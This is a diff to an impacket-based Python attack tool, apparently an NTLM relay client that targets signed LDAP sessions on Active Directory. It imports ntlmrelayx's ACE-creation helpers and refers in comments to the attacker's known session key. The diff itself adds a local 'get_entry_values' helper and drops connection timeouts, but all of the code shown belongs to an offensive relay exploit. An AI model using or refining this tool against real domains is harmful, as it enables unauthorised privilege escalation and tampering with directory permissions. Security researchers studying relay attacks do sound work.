@@ -81,7 +81,15 @@ from impacket import ntlm
 from impacket.examples.ntlmrelayx import clients as relay_clients
 from impacket.examples.ntlmrelayx.clients import ldaprelayclient
 from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
-from impacket.ldap.ldap import LDAPConnection, get_entry_values
+
+from impacket.ldap.ldap import LDAPConnection
+
+def get_entry_values(entry, attribute_name):
+    for attribute in entry['attributes']:
+        if str(attribute['type']).lower() == attribute_name.lower():
+            return list(attribute['vals'])
+    return []
+
 from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode
 from impacket.nt_errors import STATUS_ACCESS_DENIED
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
@@ -188,7 +196,7 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
         # The attacker's own signed LDAP session; its session key is known to us.
         self.raw = LDAPConnection(
             f"ldap://{ldap_host}", args.base_dn,
-            dstIp=ldap_ip, signing=True, timeout=8,
+            dstIp=ldap_ip, signing=True,
         )
         self.raw.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
         print(f"[+] Initial signed LDAP identity: {domain}\\{username}", flush=True)
@@ -282,7 +290,7 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
         try:
             check = LDAPConnection(
                 f"ldap://{ldap_host}", args.base_dn,
-                dstIp=ldap_ip, signing=True, timeout=8,
+                dstIp=ldap_ip, signing=True,
             )
             check.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
             entries = check.search(
